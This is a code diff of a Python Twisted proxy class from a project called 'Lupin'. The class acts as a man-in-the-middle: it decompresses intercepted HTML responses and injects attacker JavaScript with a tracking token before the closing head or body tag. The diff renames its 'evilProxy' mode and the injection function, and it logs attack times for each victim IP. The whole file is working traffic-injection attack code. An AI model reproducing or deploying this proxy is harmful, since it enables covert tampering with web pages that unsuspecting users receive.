@@ -1,5 +1,6 @@
 import re, string, random, zlib, gzip, StringIO, os, time
 from twisted.web.http import HTTPClient
+from Lupin.PersistentData import PersistentData
 
 class ServerConnection(HTTPClient):
 
@@ -9,11 +10,13 @@ class ServerConnection(HTTPClient):
         self.postData         = postData
         self.headers          = headers
         self.client           = client
+        self.PersistentData   = PersistentData.getInstance()
         self.isCompressed     = False
         self.contentLength    = None
         self.shutdownComplete = False
         self.actAs            = actAs
 
+		
     def getPostPrefix(self):
         return "POST"
 
@@ -37,21 +40,21 @@ class ServerConnection(HTTPClient):
 
     def handleStatus(self, version, status, message): 
 	if status != "200":
-		self.actAs = "goodProxy"
+		self.actAs = self.PersistentData._PROXY
         self.client.setResponseCode(int(status), message)
 
 
     def handleHeader(self, key, value):     
         if (key.lower() == 'content-type'):
             if "text/html" not in value:
-                self.actAs = "goodProxy"              
+                self.actAs = self.PersistentData._PROXY              
         elif (key.lower() == 'content-length'):
             self.contentLength = value
 
 	if (key.lower() == 'content-encoding') and ("gzip" not in value):
 		print "encoding: "+value
 	
-	if (key.lower() == 'content-encoding') and ("gzip" in value) and (self.actAs == "evilProxy"):
+	if (key.lower() == 'content-encoding') and ("gzip" in value) and (self.actAs == self.PersistentData._LUPIN):
                 self.isCompressed = True  
         else:
             self.client.setHeader(key, value)
@@ -66,14 +69,14 @@ class ServerConnection(HTTPClient):
            self.shutdown()
                         
     def handleResponsePart(self, data):        
-        if self.actAs == "goodProxy":
+        if self.actAs == self.PersistentData._PROXY:
             self.client.write(data)
         else:
             HTTPClient.handleResponsePart(self, data)
 
 
     def handleResponseEnd(self):      
-        if self.actAs == "goodProxy":
+        if self.actAs == self.PersistentData._PROXY:
             self.shutdown()
         else:
             HTTPClient.handleResponseEnd(self)
@@ -82,27 +85,25 @@ class ServerConnection(HTTPClient):
 
     def handleResponse(self, data):
 
-	if self.actAs == "evilProxy":
-	    if (self.isCompressed):
+        if self.actAs == self.PersistentData._LUPIN:
+            if (self.isCompressed):
                 data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
 
-            injectIndex = self.findEntryPoint(data);
-	    if injectIndex != -1:    
-            	print "FRAMING: "+self.client.getHeader("host")
-            	data = self.injectMasterFrame(data,injectIndex)
+            injectPoint = self.findInjectPoint(data);
+            if injectPoint != -1:    
+                print "FRAMING: "+self.client.getHeader("host")
+                data = self.injectSetupScript(data, injectPoint)
 	 
-
+        
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))     
 
         self.client.write(data)
         self.shutdown()
-   
+  
 
-
- 
-    def findEntryPoint(self,data):
-	headEnd = data.find("</head>")
+    def findInjectPoint(self,data):
+        headEnd = data.find("</head>")
         if headEnd == -1:
              bodyEnd = data.find("</body>")
              if bodyEnd == -1:
@@ -112,29 +113,22 @@ class ServerConnection(HTTPClient):
         else: 
              return headEnd    
 
-    def injectMasterFrame(self,data, injectIndex):            
-        newData = data[:injectIndex]
-        rest = data[injectIndex:]
-	masterFrame = open("Lupin/masterFrame.js")
-	master = masterFrame.read()
-        newData += "<script type=\"text/javascript\">"+ master +"</script>" + rest
-        masterFrame.close()
-
-	self.client.PersistentData.setLastAttackTime(self.client.getClientIP())	
+    def injectSetupScript(self,data, injectPoint):    
+        newData = data[:injectPoint]
+        rest = data[injectPoint:]
+        setupScript_fd = open("Lupin/setupScript.js")
+        setupScript =  setupScript_fd.read()
+        newData += "<script type=\"text/javascript\"> _LUPIN_FRAME_TOKEN=\"" + self.PersistentData._LUPIN_TOKEN + self.PersistentData._FRAME + "\";"+setupScript+"</script>" + rest
+        setupScript_fd.close()
+        self.client.PersistentData.setLastAttackTime(self.client.getClientIP())	
         return newData
          
-
-
     def shutdown(self):
         if not self.shutdownComplete:
-	    #print "shutting down "+self.client.getHeader('host')+self.client.getPathFromUri()
             self.shutdownComplete = True
             try:  
                self.client.finish()        
-            except:
-               print "connection dead"
+            except RuntimeError:
+               pass
             self.transport.loseConnection() 
-
-
-
 
